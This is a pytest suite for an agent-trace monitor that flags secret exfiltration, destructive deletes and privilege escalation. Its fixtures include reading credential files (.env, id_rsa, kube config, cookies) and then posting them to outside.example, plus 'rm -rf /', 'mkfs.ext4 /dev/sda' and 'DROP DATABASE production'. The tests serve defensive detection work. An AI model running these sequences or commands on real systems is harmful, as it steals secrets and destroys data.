"""Policy tests isolate deterministic evidence from learned probabilities."""

import pytest

from agentsentinel.rules import evaluate_rules
from agentsentinel.trace import normalize_trace


def signals(*steps: dict[str, object]) -> set[str]:
    return {
        hit.signal for hit in evaluate_rules(normalize_trace({"steps": list(steps)}))
    }


def step(tool: str, **args: object) -> dict[str, object]:
    return {"tool": tool, "args": args}


@pytest.mark.parametrize(
    "path",
    [
        ".env",
        "id_rsa",
        ".ssh/config",
        "credentials",
        "secret",
        "token",
        "password",
        "/etc/passwd",
    ],
)
def test_sensitive_read_paths_and_keys(path: str) -> None:
    assert "exfil:read-then-send" in signals(
        step("read_file", **{path: "demo"}),
        step("upload", destination="https://outside.example"),
    )


@pytest.mark.parametrize("read", ["file_read", "cat", "open", "env_dump", "printenv"])
def test_sensitive_read_families(read: str) -> None:
    assert "exfil:read-then-send" in signals(
        step(read, path=".env"), step("email_send", to="receiver@outside.example")
    )


@pytest.mark.parametrize(
    "send", ["http_post", "http_request", "email_send", "webhook", "upload"]
)
def test_send_families(send: str) -> None:
    assert "exfil:read-then-send" in signals(
        step("read_file", path=".env"), step(send, url="https://outside.example")
    )


@pytest.mark.parametrize(
    "destination",
    [
        "http://localhost",
        "http://LOCALHOST.:8000",
        "http://node.internal",
        "http://backup.local",
        "http://vault",
        "http://127.0.0.2",
        "http://10.2.3.4",
        "http://172.16.1.2",
        "http://192.168.1.2",
        "http://[::1]",
        "http://[fd00::1]",
        "http://[::ffff:127.0.0.1]",
        "http://user@vault.internal",
    ],
)
def test_internal_destinations_ignore_external_payload_text(destination: str) -> None:
    assert not signals(
        step("read_file", path=".env"),
        step(
            "upload", url=destination, body="contact a@example.org https://example.org"
        ),
    )


@pytest.mark.parametrize(
    "payload, encoded", [("a" * 99, False), ("a" * 100, True), ("ab01" * 25, True)]
)
def test_encoded_payload_boundary(payload: str, encoded: bool) -> None:
    fired = signals(
        step("read_file", path=".env"),
        step("http_post", url="https://outside.example", body=payload),
    )
    assert ("exfil:encoded-payload" in fired) is encoded


def test_encoding_alone_is_not_exfiltration() -> None:
    assert not signals(step("upload", url="https://outside.example", data="a" * 100))
    assert not signals(
        step("read_file", path="README.md"),
        step("upload", url="https://outside.example", data="a" * 100),
    )


@pytest.mark.parametrize(
    "path",
    [
        "/",
        "/etc",
        "/home",
        "/home/alice",
        "/srv/db",
        "/tmp/../../etc",
        "/tmp",
        "/workspace",
        "/tmp-other/data",
        "relative.txt",
        "/tmp/$TARGET",
    ],
)
def test_protected_targets(path: str) -> None:
    assert "destruction:protected-target" in signals(step("file_delete", path=path))


@pytest.mark.parametrize(
    "path",
    [
        "/tmp/build/a",
        "/var/tmp/job/a",
        "/workspace/project/a",
        "/workspaces/project/a",
        "/tmp/build/../a",
    ],
)
def test_scratch_targets(path: str) -> None:
    assert signals(step("stat", path=path), step("file_delete", path=path)) == set()


@pytest.mark.parametrize(
    "command",
    [
        "rm -rf /",
        "rm -r -f /etc",
        "mkfs.ext4 /dev/sda",
        "psql -c 'DROP TABLE customers'",
        "DROP DATABASE production",
    ],
)
def test_destructive_shell_commands(command: str) -> None:
    assert signals(step("shell", command=command)) == {
        "destruction:protected-target",
        "destruction:no-prior-inspection",
    }


def test_shell_scratch_and_mixed_operands() -> None:
    assert not signals(
        step("list", path="/tmp/build"),
        step("shell", command="rm -rf '/tmp/build/old files'"),
    )
    assert "destruction:protected-target" in signals(
        step("shell", command="rm -rf /tmp/build important.txt")
    )


def test_database_names_are_protected() -> None:
    assert "destruction:protected-target" in signals(step("delete", database="prod"))
    assert "destruction:protected-target" in signals(
        step("drop_table", table="staging")
    )


@pytest.mark.parametrize("inspection", ["read_file", "list", "list_files", "stat"])
def test_only_earlier_inspection_suppresses_signal(inspection: str) -> None:
    inspected = step(inspection, path="unrelated.txt")
    delete = step("rm", path="/etc")
    assert "destruction:no-prior-inspection" not in signals(inspected, delete)
    assert "destruction:no-prior-inspection" in signals(delete, inspected)


@pytest.mark.parametrize(
    "privilege",
    ["chmod", "chown", "create_token", "mint_key", "grant_role", "iam_attach"],
)
def test_privilege_tools(privilege: str) -> None:
    assert signals(step(privilege)) == {"escalation:privilege-op"}
    assert "escalation:then-act" in signals(
        step(privilege), step("upload", url="https://backup.internal")
    )
    assert "escalation:then-act" not in signals(step("upload"), step(privilege))


@pytest.mark.parametrize(
    "command", ["sudo systemctl restart nginx", "su root", "/usr/bin/sudo -n true"]
)
def test_privilege_shell(command: str) -> None:
    assert signals(step("shell", command=command)) == {"escalation:privilege-op"}


def test_namespace_and_nested_arguments() -> None:
    assert "exfil:read-then-send" in signals(
        step("filesystem.READ_FILE", request={"path": ".env"}),
        step("network.upload", request={"url": "https://outside.example"}),
    )


def test_rules_contribute_once() -> None:
    hits = evaluate_rules(normalize_trace({"steps": [step("rm", path="/etc")] * 4}))
    assert len(hits) == 2
    assert sum(hit.weight for hit in hits) == pytest.approx(0.95)


def test_shell_environment_dump_and_namespaced_tools() -> None:
    assert "exfil:read-then-send" in signals(
        step("shell", command="/usr/bin/printenv"),
        step("network.http_post", url="https://outside.example"),
    )


def _obscure_path(path: str) -> str:
    head, _, tail = path[1:].partition("/")
    return f"/{head}/./{tail}"


@pytest.mark.parametrize("obscure", [False, True], ids=["literal", "dotted"])
@pytest.mark.parametrize(
    ("tool", "path"),
    [
        ("file_read", "/home/operator/.kube/config"),
        ("file.read", "/home/operator/.config/browser/session-cookies.json"),
        ("file_read", "/srv/hr/private/payroll.csv"),
        ("file_read", "/home/operator/.npmrc"),
        ("file_read", "/home/operator/.pgpass"),
        ("file_read", "/etc/atlas/tls/server.key"),
    ],
)
def test_sensitive_source_family(tool: str, path: str, obscure: bool) -> None:
    if obscure:
        path = _obscure_path(path)
    assert "exfil:read-then-send" in signals(
        step(tool, path=path),
        step("http_post", url="https://outside.example/collect"),
    )


@pytest.mark.parametrize(
    "path",
    [
        "/srv/atlas/config/public-defaults.json",
        "/var/log/browser/cookie-debug.log",
        "/srv/atlas/data/public/demo-products.csv",
        "/srv/atlas/package.json",
        "/tmp/atlas-nightly.sql",
        "/etc/atlas/tls/server.crt",
    ],
)
def test_nearest_nonsensitive_source_then_send(path: str) -> None:
    assert "exfil:read-then-send" not in signals(
        step("file_read", path=path),
        step(
            "http_post",
            url="https://outside.example/collect",
            body="diagnostic note",
        ),
    )
